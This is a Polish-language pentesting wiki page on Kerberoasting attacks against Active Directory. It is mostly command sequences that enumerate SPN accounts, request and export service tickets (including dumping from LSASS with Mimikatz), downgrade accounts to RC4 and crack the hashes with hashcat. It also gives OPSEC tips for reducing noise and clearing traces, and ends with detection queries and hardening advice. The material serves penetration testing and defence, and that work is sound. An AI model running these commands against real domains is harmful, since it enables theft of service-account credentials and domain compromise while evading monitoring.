# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting koncentruje się na pozyskiwaniu TGS tickets, w szczególności tych powiązanych z usługami działającymi w ramach kont użytkowników w Active Directory (AD), z wyłączeniem kont komputerów. Szyfrowanie tych tickets wykorzystuje klucze pochodzące z haseł użytkowników, co umożliwia offline credential cracking. Użycie konta użytkownika jako usługi wskazuje niepusta właściwość ServicePrincipalName (SPN).

Każdy uwierzytelniony użytkownik domeny może żądać TGS tickets, więc nie są wymagane specjalne uprawnienia.<sup>[[4]](#references)[[5]](#references)</sup>

### Najważniejsze informacje

- Dotyczy TGS tickets dla usług działających w ramach kont użytkowników (tj. kont z ustawionym SPN; nie kont komputerów).
- Tickets są szyfrowane kluczem wyprowadzonym z hasła service account i mogą być łamane offline.
- Nie są wymagane podwyższone uprawnienia; każde uwierzytelnione konto może żądać TGS tickets.

> [!WARNING]
> Większość publicznych narzędzi preferuje żądanie service tickets RC4-HMAC (etype 23), ponieważ są szybsze do złamania niż AES. Hashes RC4 TGS zaczynają się od `$krb5tgs$23$*`, AES128 od `$krb5tgs$17$*`, a AES256 od `$krb5tgs$18$*`. Jednak wiele środowisk przechodzi na tryb wyłącznie AES. Nie zakładaj, że istotny jest tylko RC4.
> Unikaj także roastingu typu „spray-and-pray”. Domyślny kerberoast w Rubeus może odpytywać i żądać tickets dla wszystkich SPN, przez co generuje dużo szumu. Najpierw enumeruj i wybierz interesujące principals.

### Sekrety service account i koszt kryptografii Kerberos

Wiele usług nadal działa w ramach kont użytkowników z ręcznie zarządzanymi hasłami. KDC szyfruje service tickets kluczami wyprowadzonymi z tych haseł i przekazuje ciphertext każdemu uwierzytelnionemu principal, dlatego kerberoasting zapewnia nieograniczoną liczbę prób offline bez lockoutów i telemetryki DC. Tryb szyfrowania określa dostępny budżet na cracking:

| Tryb | Wyprowadzanie klucza | Typ szyfrowania | Przybliżona przepustowość RTX 5090* | Uwagi |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 z 4 096 iteracjami i solą per-principal generowaną z domeny + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 miliona guesses/s | Sól blokuje rainbow tables, ale nadal umożliwia szybki cracking krótkich haseł. |
| RC4 + NT hash | Pojedyncze MD4 hasła (niesolony NT hash); Kerberos dodaje tylko 8-bajtowy confounder do każdego ticket | etype 23 (`$krb5tgs$23$`) | ~4,18 **miliarda** guesses/s | ~1000× szybciej niż AES; attackers wymuszają RC4, gdy `msDS-SupportedEncryptionTypes` na to pozwala. |

*Benchmarks from Chick3nman as cited in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Confounder RC4 tylko randomizuje keystream; nie zwiększa nakładu pracy na próbę. Jeśli service accounts nie korzystają z losowych sekretów (gMSA/dMSA, machine accounts lub strings zarządzanych przez vault), szybkość compromise zależy wyłącznie od budżetu GPU. Wymuszenie etype wyłącznie AES usuwa downgrade do miliarda guesses-per-second, ale słabe hasła tworzone przez ludzi nadal mogą zostać złamane przez PBKDF2.<sup>[[3]](#references)</sup>

### Atak

#### Linux

Praktyczny przykład end-to-end wykorzystujący NetExec do żądania roastable tickets i Hashcat do ich złamania jest dostępny w referencji [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Narzędzia wielofunkcyjne, w tym kontrole kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerate użytkowników podatnych na Kerberoasting
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Poproś o TGS i wykonaj zrzut z pamięci
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technika 2: Narzędzia automatyczne
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Żądanie TGS generuje Windows Security Event 4769 (zażądano biletu usługi Kerberos).

### OPSEC i środowiska tylko z AES

- Celowo żądaj RC4 dla kont bez AES:
- Rubeus: `/rc4opsec` używa tgtdeleg do wyliczenia kont bez AES i żąda biletów usługowych RC4.
- Rubeus: `/tgtdeleg` razem z kerberoast również wywołuje żądania RC4, jeśli jest to możliwe.<sup>[[6]](#references)</sup>
- Wykonuj roast kont tylko z AES zamiast kończyć działanie po cichu:
- Rubeus: `/aes` wylicza konta z włączonym AES i żąda biletów usługowych AES (etype 17/18).
- Jeśli masz już TGT (PTT lub z pliku .kirbi), możesz użyć `/ticket:<blob|path>` razem z `/spn:<SPN>` lub `/spns:<file>` i pominąć LDAP.
- Targetowanie, ograniczanie częstotliwości i mniejszy szum:
- Używaj `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtruj konta z prawdopodobnie słabymi hasłami za pomocą `/pwdsetbefore:<MM-dd-yyyy>` (starsze hasła) lub targetuj uprzywilejowane OU za pomocą `/ou:<DN>`.<sup>[[8]](#references)</sup>

Przykłady (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Jeśli kontrolujesz konto lub możesz je modyfikować, możesz sprawić, że będzie możliwe wykonanie na nim kerberoasting, dodając SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Obniż poziom konta, aby włączyć RC4 i ułatwić cracking (wymaga uprawnień zapisu do obiektu docelowego):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast przez GenericWrite/GenericAll wobec użytkownika (tymczasowy SPN)

Gdy BloodHound pokazuje, że masz kontrolę nad obiektem użytkownika (np. GenericWrite/GenericAll), możesz niezawodnie wykonać „targeted-roast” na tym konkretnym użytkowniku, nawet jeśli obecnie nie ma on żadnych SPN:<sup>[[9]](#references)</sup>

- Dodaj tymczasowy SPN do kontrolowanego użytkownika, aby stał się roastable.
- Zażądaj TGS-REP zaszyfrowanego przy użyciu RC4 (etype 23) dla tego SPN, aby ułatwić cracking.
- Złam hash `$krb5tgs$23$...` za pomocą hashcat.
- Usuń SPN, aby zmniejszyć footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatyzuje dodanie SPN -> żądanie TGS (etype 23) -> usunięcie SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crackuj wynik za pomocą autodetekcji hashcat (tryb 13100 dla `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Uwagi dotyczące detekcji: dodawanie/usuwanie SPN powoduje zmiany w katalogu (zdarzenia o identyfikatorach 5136/4738 na docelowym użytkowniku), a żądanie TGS generuje zdarzenie o identyfikatorze 4769. Rozważ ograniczanie tempa i czyszczenie śladów.

Przydatne narzędzia do ataków kerberoast znajdziesz tutaj: https://github.com/nidem/kerberoast

Jeśli w systemie Linux pojawi się ten błąd: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, wynika on z rozbieżności czasu lokalnego. Zsynchronizuj czas z kontrolerem domeny:

- `ntpdate <DC_IP>` (przestarzałe w niektórych dystrybucjach)
- `rdate -n <DC_IP>`

### Kerberoast bez konta domenowego (AS-requested STs)

We wrześniu 2022 roku Charlie Clark pokazał, że jeśli principal nie wymaga pre-authentication, można uzyskać service ticket za pomocą spreparowanego KRB_AS_REQ poprzez zmianę sname w treści żądania, skutecznie uzyskując service ticket zamiast TGT. Działa to podobnie jak AS-REP roasting i nie wymaga prawidłowych poświadczeń domenowych.

Szczegóły znajdziesz w opracowaniu Semperis „New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Musisz podać listę użytkowników, ponieważ bez prawidłowych poświadczeń nie możesz wykonywać zapytań LDAP przy użyciu tej techniki.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Powiązane

Jeśli celem są użytkownicy podatni na AS-REP roasting, zobacz również:

{{#ref}}
asreproast.md
{{#endref}}

### Wykrywanie

Kerberoasting może być trudny do wykrycia. Wyszukuj Event ID 4769 z DC i stosuj filtry, aby ograniczyć szum:

- Wyklucz nazwę usługi `krbtgt` oraz nazwy usług kończące się na `$` (konta komputerów).
- Wyklucz żądania pochodzące z kont komputerów (`*$$@*`).
- Uwzględniaj tylko pomyślne żądania (Failure Code `0x0`).
- Monitoruj typy szyfrowania: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Nie generuj alertów wyłącznie dla `0x17`.

Przykład wstępnej analizy w PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatkowe pomysły:

- Ustal bazowy poziom normalnego użycia SPN dla każdego hosta/użytkownika; generuj alerty przy dużych seriach różnych żądań SPN od jednego principal.
- Oznaczaj nietypowe użycie RC4 w domenach zabezpieczonych za pomocą AES.

### Mitigacja / Hardening

- Używaj gMSA/dMSA lub kont komputerów dla usług. Konta zarządzane mają losowe hasła o długości ponad 120 znaków i są automatycznie rotowane, co sprawia, że offline cracking jest niepraktyczny.<sup>[[7]](#references)</sup>
- Wymuś AES dla kont usług, ustawiając `msDS-SupportedEncryptionTypes` wyłącznie na AES (dziesiętnie 24 / szesnastkowo 0x18), a następnie rotując hasło, aby zostały wygenerowane klucze AES.<sup>[[7]](#references)</sup>
- Jeśli to możliwe, wyłącz RC4 w swoim środowisku i monitoruj próby użycia RC4. Na DC możesz użyć wartości rejestru `DefaultDomainSupportedEncTypes`, aby sterować ustawieniami domyślnymi dla kont, dla których nie ustawiono `msDS-SupportedEncryptionTypes`. Dokładnie przetestuj tę zmianę.
- Usuń niepotrzebne SPN z kont użytkowników.<sup>[[7]](#references)</sup>
- Jeśli użycie kont zarządzanych nie jest możliwe, stosuj długie, losowe hasła kont usług (25+ znaków); blokuj popularne hasła i regularnie przeprowadzaj audyty.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + łamanie hashy przez hashcat w praktyce](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: ataki o niskim poziomie technicznym i dużym wpływie wykorzystujące starszą kryptografię Kerberos (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Jak zaatakować Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Nadużycie Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: żądanie szyfrowanych za pomocą RC4 TGS, gdy AES jest włączony](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Wskazówki Microsoftu pomagające ograniczyć Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Dokumentacja polecenia Rubeus kerberoast](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — dane uwierzytelniające SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nowe ścieżki ataku? Żądane bilety usług (Charlie Clark, wrzesień 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
